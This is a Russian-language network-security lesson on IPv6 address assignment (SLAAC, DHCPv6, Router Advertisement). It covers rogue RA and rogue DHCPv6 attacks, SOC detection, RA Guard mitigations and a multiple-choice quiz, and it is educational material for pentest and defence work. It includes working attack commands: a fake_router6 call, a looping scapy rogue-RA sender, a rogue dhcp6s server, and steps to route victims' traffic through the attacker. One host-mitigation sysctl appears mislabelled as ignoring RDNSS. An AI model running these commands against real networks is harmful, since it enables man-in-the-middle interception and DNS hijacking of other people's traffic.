---
id: network-dhcpv6
title: "DHCPv6 и SLAAC: назначение адресов, RA-атаки и rogue-сервер"
category: network
parent: network-ipv6
difficulty: medium
order: 1
tags: [network, dhcpv6, slaac, ipv6, ra, ndp, rogue]
prerequisites: [network-ipv6, network-module-ip]
useful_for:
  - "CTF Network (IPv6-конфигурация)"
  - "Пентест: rogue DHCPv6/RA, перехват IPv6"
  - "Работа (SOC): детект RA-спуфинга"
estimated_minutes: 55
summary: "Как IPv6 назначает адреса (SLAAC, DHCPv6, RA), чем опасны rogue DHCPv6 и RA-спуфинг, как подсунуть жертве свой DNS/шлюз и как защититься (RA Guard, DHCPv6 Guard)."
---

В IPv6 адреса чаще всего назначаются **автоматически**: через SLAAC (Router Advertisement) или DHCPv6. Оба механизма не аутентифицированы, поэтому атакующий в сегменте может объявить себя маршрутизатором или DHCPv6-сервером и перенаправить весь трафик через себя. Урок — часть [`network-module-ip`](network-module-ip) и дополняет [`network-dhcp`](network-dhcp).

## Три способа получить IPv6-адрес

- **SLAAC** (Stateless Address Autoconfiguration) — хост формирует адрес из префикса RA (`2001:db8::/64`) + свой интерфейсный идентификатор. Не требует сервера.
- **DHCPv6 stateful** — сервер выдаёт адрес и параметры (DNS, домен).
- **DHCPv6 stateless** — адрес из SLAAC, а параметры (DNS) — по DHCPv6.

Флаги в RA: **M** (managed — использовать DHCPv6 для адреса), **O** (other — использовать DHCPv6 для параметров).

```bash
# Посмотреть IPv6-адреса и флаги
ip -6 addr show
ip -6 route show default
# Соседи (NDP)
ip -6 neigh show
```

## Router Advertisement и Neighbor Discovery

RA-сообщения (ICMPv6 type 134) рассылаются маршрутизаторами каждые ~200 секунд на multicast `ff02::1`. Хост принимает RA и настраивает адрес + шлюз. **NDP** (Neighbor Discovery, ICMPv6 135/136) заменяет ARP: запрос «кто владеет этим IPv6» → ответ с MAC.

```bash
# Захватить RA/NDP
sudo tcpdump -i eth0 -nn 'icmp6 and (ip6[40] == 134 or ip6[40] == 135 or ip6[40] == 136)'
```

## Rogue RA: поддельный маршрутизатор

Атакующий рассылает RA с флагом «я шлюз» и своим адресом. Хосты перенастраивают маршрут по умолчанию через него — полный MITM. Дополнительно можно подсунуть **свой DNS** (RDNSS option) и перехватить разрешение имён.

```bash
# Отправить rogue RA (инструмент: fake_router6 или scapy)
sudo fake_router6 eth0 2001:db8::1/64
# Или через scapy
python3 - <<'PY'
from scapy.all import *
sendp(Ether(dst="33:33:00:00:00:01")/IPv6(dst="ff02::1")/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix="2001:db8::", prefixlen=64), iface="eth0", loop=1, inter=3)
PY
```

## Rogue DHCPv6

Аналог IPv4-rogue-DHCP: поддельный DHCPv6-сервер выдаёт адреса и параметры (в первую очередь **DNS**). Жертва начинает резолвить имена через атакующего.

```bash
# Поднять rogue DHCPv6 (лаборатория)
sudo dhcp6s -c /etc/dhcp6s.conf eth0
# Наблюдать, кто запрашивает
sudo tcpdump -i eth0 -nn 'udp port 546 or udp port 547'
```

## DHCPv6 и DNS: главный приз

Часто атакуют не ради адреса, а ради **DNS**: RDNSS-опция в RA или DHCPv6 опция 23 позволяют указать свой резолвер. Далее — DNS-спуфинг, туннелирование, перехват. См. [`network-dns-attacks`](network-dns-attacks).

```bash
# Проверить, какой DNS назначен по IPv6
cat /etc/resolv.conf
resolvectl status | grep -A2 "DNS Servers"
```

## Практика: перехват IPv6-трафика

```bash
# 1. Стать маршрутизатором (forwarding)
sysctl -w net.ipv6.conf.all.forwarding=1
# 2. Отправить rogue RA (см. выше)
# 3. Смотреть трафик, идущий через вас
sudo tcpdump -i eth0 -nn ip6 -c 20
# 4. Проверить, изменился ли маршрут у жертвы
ip -6 route show default
```

## Детект в SOC

- **RA от неизвестного источника** (не ваш маршрутизатор) — rogue RA;
- **частые RA** — flood/атака;
- **DHCPv6-сервер на неожиданном адресе** — rogue;
- **смена маршрута/DNS по IPv6** у хостов;
- **ICMPv6 134 из нетипичного MAC**.

```bash
# Топ источников RA
tshark -r cap.pcap -Y 'icmpv6.type==134' -T fields -e ipv6.src -e eth.src | sort | uniq -c | sort -rn
```

## Защита

| Мера | Против чего |
|---|---|
| RA Guard на access-портах | rogue RA |
| DHCPv6 Guard | rogue DHCPv6 |
| ND Inspection / SAVI | NDP-спуфинг |
| Фильтрация ICMPv6 на хостах | поддельные RA/NDP |
| Явная IPv6-политика | обход через IPv6 |
| `accept_ra=0` на серверах | подмена маршрута |

```text
# Cisco: RA Guard на порту доступа
interface Gi0/1
 ipv6 nd raguard attach-policy HOST
```

## Частые ошибки

- **Считать, что IPv6 «сам настроится безопасно»** — SLAAC доверяет любому RA.
- **Игнорировать DHCPv6** — приз часто DNS, а не адрес.
- **Не включать RA Guard** — rogue RA проходит.
- **Путать M и O флаги** — неверная трактовка конфигурации.
- **Забывать про RDNSS** — DNS утекает к атакующему.
- **Тестировать только IPv4** — IPv6-путь остаётся незакрытым.
- **Не мониторить NDP** — спуфинг соседей невидим.

## Что дальше / решение

После DHCPv6/SLAAC переходите к [`network-ipv6`](network-ipv6) (RA/NDP-атаки глубоко) и [`network-ipv6-tunneling`](network-ipv6-tunneling). Для DNS-атак — [`network-dns-attacks`](network-dns-attacks).

## Формат RA и опций

Router Advertisement (ICMPv6 type 134) несёт набор опций:

| Опция | Содержимое |
|---|---|
| Prefix Information | префикс для SLAAC, флаги A/L |
| MTU | размер MTU для сегмента |
| RDNSS | адрес DNS-сервера |
| DNSSL | домен поиска |
| Route Information | маршрут для префикса |

Именно **RDNSS** делает rogue RA таким опасным: одной опцией атакующий назначает свой DNS всем хостам.

```bash
# Разобрать опции RA
tshark -r cap.pcap -Y 'icmpv6.type==134' -V | grep -E "Prefix|RDNSS|MTU|flag"
```

## Практика: перехват и разбор DHCPv6

```bash
# 1. Захватить обмен DHCPv6
sudo tcpdump -i eth0 -nn -w dhcp6.pcap 'udp port 546 or udp port 547'
# 2. Понять, кто сервер, кто клиент
tshark -r dhcp6.pcap -Y 'dhcpv6' -T fields -e ipv6.src -e udp.srcport -e dhcpv6.msgtype
# 3. Вытащить выданные DNS
tshark -r dhcp6.pcap -Y 'dhcpv6.option.type==23' -T fields -e dhcpv6.option.value
# 4. Запросить адрес вручную (если разрешено)
sudo dhcp6c -f eth0
```

Ключевое: DHCPv6 и RA **не аутентифицированы**. Любой хост в сегменте может отвечать, и клиент примет первый валидный ответ.

## Митигации на хосте

```bash
# Сервер: не принимать RA и не перестраивать маршрут
sysctl -w net.ipv6.conf.eth0.accept_ra=0
# Игнорировать RDNSS от RA (использовать свой DNS)
sysctl -w net.ipv6.conf.eth0.accept_ra_rt_info_max_plen=0
# Включить RA Guard на коммутаторе (см. выше)
```

На серверах и роутерах автонастройку по RA обычно отключают полностью: маршрут и DNS задаются статически. На клиентских сегментах защита — RA Guard и DHCPv6 Guard на портах доступа.

## SLAAC vs DHCPv6: когда что

| Свойство | SLAAC | DHCPv6 |
|---|---|---|
| Кто выдаёт адрес | хост сам (из RA) | сервер |
| Нужен сервер | нет | да |
| Аутентификация | нет | нет |
| DNS | через RDNSS в RA | опция 23 |
| Учёт/аудит | нет | есть (lease) |
| Типичное применение | клиентские сети | управляемые сети |

Часто используется гибрид: адрес по SLAAC, а DNS/домен — по DHCPv6 (stateless). Именно поэтому блокировка только DHCPv6 не спасает: RDNSS в RA всё равно прилетит.

## Практический чек-лист

1. Есть ли у хостов **IPv6-адреса** (`ip -6 addr`)?
2. Откуда приходят **RA** и какие в них **RDNSS**?
3. Кто отвечает на **DHCPv6** (легитимный сервер или rogue)?
4. Настроены ли **RA Guard** и **DHCPv6 Guard** на портах доступа?
5. Принимают ли серверы **RA** (`accept_ra`)?
6. Логируется ли смена маршрута/DNS по IPv6?
7. Есть ли **NDP-спуфинг** (дубликаты, частые Advertisement)?

```bash
# Снимок IPv6-конфигурации для отчёта
ip -6 addr show; ip -6 route show; resolvectl status | grep -A3 'Link.*eth0'
# Наблюдение за RA/DHCPv6
sudo tcpdump -i eth0 -nn -c 20 'icmp6[icmp6type]==134 or udp port 547'
```

Этот чек-лист закрывает и атаку (rogue RA/DHCPv6), и защиту (guards), и детект (мониторинг). В IPv6 конфигурация «по умолчанию» — почти всегда доверяющая, поэтому явная политика обязательна.

## Квиз

```quiz
- question: "Что означает флаг M в Router Advertisement?"
  options:
    - "Использовать DHCPv6 для получения адреса (managed)"
    - "Только SLAAC"
    - "Отключить IPv6"
    - "Использовать DNS"
  answer: 0
  explanation: "M (managed) указывает хосту взять адрес по DHCPv6."
- question: "Какой тип ICMPv6 используется для Router Advertisement?"
  options:
    - "134"
    - "135"
    - "136"
    - "133"
  answer: 0
  explanation: "RA — ICMPv6 type 134; 133 — Router Solicitation."
- question: "Чем опасен rogue RA?"
  options:
    - "Хосты перенастраивают маршрут через атакующего (MITM)"
    - "Ускоряется сеть"
    - "Отключается IPv4"
    - "Меняется MAC"
  answer: 0
  explanation: "Поддельный RA делает атакующего шлюзом по умолчанию."
- question: "Что чаще всего является целью rogue DHCPv6?"
  options:
    - "Указать свой DNS (RDNSS/опция 23)"
    - "Изменить MAC"
    - "Отключить STP"
    - "Сменить VLAN"
  answer: 0
  explanation: "Контроль DNS даёт спуфинг и перехват имён."
- question: "Какая защита блокирует rogue RA на порту?"
  options:
    - "RA Guard"
    - "STP"
    - "VTP"
    - "DTP"
  answer: 0
  explanation: "IPv6 RA Guard отбрасывает RA от недоверенных портов."
```

## Где пригодится

- **CTF:** задачи с IPv6-конфигурацией и RA/NDP.
- **Пентест:** rogue RA/DHCPv6 для перехвата IPv6-трафика.
- **SOC:** детект поддельных RA и DHCPv6-серверов.
- **Инженерия:** RA Guard, DHCPv6 Guard, SAVI.
